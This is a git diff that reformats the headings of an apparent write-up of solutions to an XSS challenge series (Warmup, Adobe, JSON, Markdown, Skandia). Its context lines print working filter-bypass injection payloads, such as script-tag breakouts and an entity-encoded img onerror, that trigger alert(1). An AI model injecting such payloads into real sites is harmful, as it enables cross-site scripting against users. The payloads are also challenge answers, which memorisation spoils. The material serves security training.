@@ -11,7 +11,7 @@
 - JSON2
 
 
-### 1. Warmup
+## Warmup
 
 - Task
 
@@ -21,14 +21,13 @@ function escape(s) {
 }
 ```
 
--Solution
+- Solution
 
 ```
 ",alert(1),"
 ```
 
-
-### Adobe
+## Adobe
 
 - Task
 
@@ -45,9 +44,7 @@ function escape(s) {
 \");alert(1)//
 ```
 
-
-
-### JSON
+## JSON
 
 - Task
 
@@ -64,8 +61,7 @@ function escape(s) {
 </script><script>alert(1)//
 ```
 
-
-### Markdown
+## Markdown
 
 - Task
 
@@ -86,8 +82,7 @@ function escape(s) {
 [[x|http://onerror=javascript:alert(1)//]]
 ```
 
-
-### Skandia
+## Skandia
 
 - Task
 
@@ -103,8 +98,7 @@ function escape(s) {
 </script><img src onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
 ```
 
-
-### JSON2
+## JSON2
 
 - Task
 
